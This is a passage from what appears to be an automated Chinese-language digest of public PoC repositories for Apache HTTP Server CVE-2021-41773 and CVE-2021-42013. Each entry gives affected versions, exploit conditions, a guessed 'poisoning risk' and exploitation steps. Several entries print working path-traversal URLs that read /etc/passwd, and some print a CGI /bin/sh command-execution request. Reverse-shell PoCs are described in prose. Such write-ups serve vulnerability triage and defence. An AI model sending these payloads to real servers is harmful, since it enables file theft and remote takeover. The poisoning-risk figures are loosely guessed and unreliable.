**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
